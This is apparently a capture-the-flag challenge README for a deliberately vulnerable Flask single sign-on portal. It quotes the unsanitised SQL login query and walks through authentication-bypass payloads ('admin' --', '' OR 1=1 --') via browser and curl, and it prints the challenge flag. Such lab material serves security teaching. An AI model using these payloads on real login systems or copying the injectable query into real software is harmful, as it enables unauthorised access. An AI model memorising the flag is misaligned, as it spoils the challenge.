# Stage 4: NexaAuth SSO Portal Gateway

## Overview
- Category: Web Security
- Vulnerability: SQL Injection (Authentication Bypass)
- Port: 8084 (HTTP)
- Difficulty: Medium
- Flag: `SHADOWNET{front_door_bdc72fd1e584a689f94276ab}`

## Description
Stage 4 exposes the NexaCorp internal single sign-on (SSO) gateway (`NexaAuth`). Employees use this portal to access internal tools, account records, and administrator control panels. Unprivileged accounts only see basic employee records, while an authenticated administrator account (`role = 'admin'`) is granted access to the internal flag stored in the secure database records table.

The application contains an unsanitized SQL query in its credential verification handler, allowing an attacker to manipulate the query logic and authenticate without a valid password.

## Directory Structure
- `app.py`: Flask application containing the routing logic, SQLite database initialization, and vulnerable authentication query.
- `wsgi.py`: WSGI entrypoint for production servers (Gunicorn).
- `templates/`: Jinja2 HTML templates.
  - `base.html`: Common layout wrapper.
  - `login.html`: NexaAuth login form.
  - `dashboard.html`: Authenticated portal landing page that displays user details and the admin flag.
- `static/portal.css`: Portal stylesheet and visual theme.
- `test_app.py`: Unit and regression test suite.
- `Dockerfile`: Minimal, hardened container image running unprivileged.
- `docker-compose.yml`: Compose file mounting isolated `/tmp` tmpfs and binding port 8084.
- `requirements.txt`: Python package requirements (Flask, Gunicorn).

## Running the Challenge

### Using Docker Compose
Start the web service container:
```bash
docker compose -f stages/stage4-web/docker-compose.yml up -d
```

Access the application in your browser at:
```
http://localhost:8084
```

To stop the container:
```bash
docker compose -f stages/stage4-web/docker-compose.yml down
```

### Running Natively with Python
To run the Flask application directly:
```bash
python3 stages/stage4-web/app.py
```

To stop the process:
```bash
pkill -f "stages/stage4-web/app.py"
```

## Vulnerability Details

Inspect lines 98-103 of `app.py`:
```python
query = (
    "SELECT id FROM users WHERE username = '" + username
    + "' AND password = '" + password + "'"
)
with connect(app) as db:
    user = db.execute(query).fetchone()
```

The application concatenates user inputs directly into the SQL statement without parameterized queries or input sanitization.

In the database, the administrator account is created as:
```python
(1, 'admin', '<random_hash>', 'Portal Administrator', 'admin')
```
And the flag is placed in `internal_records`:
```python
INSERT INTO internal_records VALUES ('front_door_access', '<FLAG>')
```

When a user successfully logs in with `role == 'admin'`, the `/dashboard` route queries `internal_records` and renders the flag.

## Exploitation Walkthrough

### 1. Constructing the Payload
To bypass authentication and log in as user `admin`, we need to comment out the remainder of the query starting after the username check:
- Target username input: `admin' --`
- Target password input: `anything`

When formatted into the query, the resulting SQL execution becomes:
```sql
SELECT id FROM users WHERE username = 'admin' --' AND password = '...'
```
The `--` sequence in SQLite treats the rest of the line as a comment, evaluating the statement purely as `WHERE username = 'admin'`.

### 2. Executing the Exploit

#### Via Web Browser
1. Open `http://localhost:8084/login`.
2. In the **Username** field, enter: `admin' --`
3. In the **Password** field, enter any value (e.g. `password`).
4. Click **Sign in to NexaCorp Portal**.
5. The portal redirects to `/dashboard`, rendering the administrator control panel with the flag displayed:
   ```
   SHADOWNET{front_door_bdc72fd1e584a689f94276ab}
   ```

#### Via cURL
```bash
curl -s -c cookies.txt -X POST http://localhost:8084/login \
  -d "username=admin' --" \
  -d "password=test" \
  -L | grep "SHADOWNET{"
```

Output:
```text
<span class="flag">SHADOWNET{front_door_bdc72fd1e584a689f94276ab}</span>
```

### 3. Alternative SQL Payloads
The following payloads are also effective:
- `' OR 1=1 --` (matches the first record in the database, which is the admin user)
- `admin' /*` with closing comment in password

